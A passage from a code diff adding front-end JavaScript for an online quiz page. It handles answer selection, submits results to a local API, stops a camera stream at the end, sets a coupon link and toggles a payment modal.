+                    document.querySelectorAll('.quiz-option').forEach(el => el.classList.remove('selected'));
+                    optDiv.classList.add('selected');
+                    currentlySelectedQuizOptionIndex = mappingLabels[idx];
+                    document.getElementById('quiz-next-action-btn').disabled = false;
+                };
+                optionsBox.appendChild(optDiv);
+            });
+        }
+
+        async function progressQuizNavigationStep() {
+            if(!currentlySelectedQuizOptionIndex) return;
+            studentResponseSelectionArray.push(currentlySelectedQuizOptionIndex);
+            if(indexTrackQuizPointer + 1 < adaptiveEvaluationQuestionsList.length) {
+                indexTrackQuizPointer++;
+                renderCurrentQuestionIntoEvaluationWidget();
+            } else {
+                if(globalCameraMediaStreamReference) {
+                    globalCameraMediaStreamReference.getTracks().forEach(track => track.stop());
+                }
+                const res = await fetch('/api/evaluate-results', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        email: loggedInStudentProfileData.email,
+                        answers: studentResponseSelectionArray
+                    })
+                });
+                const metric = await res.json();
+                try {
+                    const incentiveRes = await fetch('/api/get-incentive-link');
+                    const incentiveData = await incentiveRes.json();
+                    document.getElementById('coupon-redirection-anchor').href = incentiveData.coupon_url;
+                } catch(err) {
+                    document.getElementById('coupon-redirection-anchor').href = LINK_5_REWARD_FEEDBACK;
+                }
+                document.getElementById('exam-active-panel').style.display = 'none';
+                document.getElementById('exam-completion-view').classList.remove('hidden');
+                document.getElementById('evaluationScoreOutputString').innerText = `Final Score: ${metric.score}/10 (${metric.percentage}%)`;
+                if(metric.high_performer) {
+                    document.getElementById('fastTrackDiscountAlert').classList.remove('hidden');
+                }
+            }
+        }
+
+        function launchPurchaseProcess(asset, cost) {
+            document.getElementById('paymentModalItemName').innerText = asset;
+            document.getElementById('paymentModalCostString').innerText = `Sponsorship Rate: ₹${cost}`;
+            document.getElementById('checkoutGatewayModal').style.display = 'flex';
+        }
+        function closeActiveModal() { 
+            document.getElementById('checkoutGatewayModal').style.display = 'none'; 
+            document.getElementById('cameraConsentInstructionModal').style.display = 'none'; 
+        }
+        function togglePaymentInterfaceFields(type) {
+            document.getElementById('payModeUpi').classList.toggle('active', type === 'UPI');
+            document.getElementById('payModeCard').classList.toggle('active', type === 'CARD');
+        }
+    </script>
+</body>
+</html>
